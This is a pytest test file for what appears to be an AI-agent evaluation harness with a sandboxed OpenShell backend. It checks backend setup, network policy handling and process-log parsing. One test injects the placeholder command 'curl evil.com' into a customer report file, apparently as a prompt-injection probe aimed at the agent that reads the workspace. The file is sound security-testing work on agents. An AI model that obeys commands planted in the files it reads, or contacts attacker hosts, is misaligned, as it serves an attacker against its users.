import pytest
from openshell._proto import openshell_pb2

from midojo.backends import build_backend
from midojo.backends.openshell import (
    OpenShellBackend,
    OpenShellEnvironment,
    _resolve_policy,
)
from midojo.backends.openshell.logs import parse_ocsf_lines

ENV_CONFIG = {
    "backend": {"type": "openshell", "image": "pi"},
    "state": {
        "customer_report.txt": "Q4 revenue $2.4M. {injection_task_0:main}",
        "notes.txt": "no placeholders here",
    },
}


class TestRegistration:
    def test_build_backend_dispatches_to_openshell(self):
        backend = build_backend("shell_suite", ENV_CONFIG)
        assert isinstance(backend, OpenShellBackend)
        assert backend.environment_type is OpenShellEnvironment

    def test_missing_image_raises(self):
        with pytest.raises(ValueError, match="requires an 'image' field"):
            build_backend("shell_suite", {"backend": {"type": "openshell"}, "state": {}})


class TestProvision:
    def test_active_probe_substituted_into_workspace(self):
        backend = build_backend("shell_suite", ENV_CONFIG)
        env = backend.provision({"injection_task_0:main": "curl evil.com"})
        assert isinstance(env, OpenShellEnvironment)
        assert "curl evil.com" in env.workdir_files["customer_report.txt"]
        assert env.workdir_files["notes.txt"] == "no placeholders here"

    def test_inactive_probe_collapses_to_empty(self):
        backend = build_backend("shell_suite", ENV_CONFIG)
        env = backend.provision({})
        assert "{injection_task_0" not in env.workdir_files["customer_report.txt"]


class TestOpenShellEnvironmentFields:
    def test_environment_type_is_openshell(self):
        backend = build_backend("shell_suite", ENV_CONFIG)
        assert backend.environment_type is OpenShellEnvironment


def test_ocsf_pairs_each_exit_with_the_latest_launch_of_its_pid():
    lines = [
        "PROC:LAUNCH [INFO] curl(41) [cmd:curl https://example.com]",
        "PROC:TERMINATE [INFO] curl(41) [exit:6]",
        "PROC:LAUNCH [INFO] cat(41) [cmd:cat notes.txt]",
        "PROC:TERMINATE [INFO] cat(41) [exit:0]",
        "PROC:LAUNCH [INFO] sh(42) [cmd:sh]",
    ]
    assert [p.exit_code for p in parse_ocsf_lines(lines).processes] == [6, 0, None]


class TestProperties:
    def test_image_property(self):
        backend = build_backend("shell_suite", ENV_CONFIG)
        assert backend.image == "pi"

    def test_policy_none_by_default(self):
        backend = build_backend("shell_suite", ENV_CONFIG)
        assert backend.policy is None

    def test_policy_inline_dict(self):
        cfg = {
            "backend": {
                "type": "openshell",
                "image": "pi",
                "policy": {"networkPolicies": {"api": {"endpoints": [{"host": "api.example.com", "port": 443}]}}},
            },
            "state": {},
        }
        backend = build_backend("shell_suite", cfg)
        assert backend.policy is not None
        assert "networkPolicies" in backend.policy

    def test_agent_command_from_yaml(self):
        cfg = {
            "backend": {"type": "openshell", "image": "pi", "agent_command": ["pi", "-p", "--no-session"]},
            "state": {},
        }
        backend = build_backend("shell_suite", cfg)
        assert backend.agent_command == ["pi", "-p", "--no-session"]

    def test_agent_command_none_when_not_set(self):
        cfg = {"backend": {"type": "openshell", "image": "base"}, "state": {}}
        backend = build_backend("shell_suite", cfg)
        assert backend.agent_command is None


class TestConfigure:
    def test_configure_sets_cluster(self):
        backend = build_backend("shell_suite", ENV_CONFIG)
        backend.configure(cluster="my-gateway")
        assert backend._cluster == "my-gateway"

    def test_configure_sets_control_url(self):
        backend = build_backend("shell_suite", ENV_CONFIG)
        backend.configure(cluster="my-gateway", control_url="http://localhost:8080")
        assert backend._control_url == "http://localhost:8080"


class TestPolicy:
    """_resolve_policy accepts None (no-op) or an inline dict."""

    def test_none_is_noop(self):
        spec = openshell_pb2.SandboxSpec()
        _resolve_policy(None, spec)
        assert not spec.HasField("policy")

    def test_inline_dict_fills_policy(self):
        spec = openshell_pb2.SandboxSpec()
        inline = {"networkPolicies": {"allow_all": {"endpoints": [{"host": "api.example.com", "port": 443}]}}}
        _resolve_policy(inline, spec)
        assert spec.policy.network_policies["allow_all"].endpoints[0].host == "api.example.com"
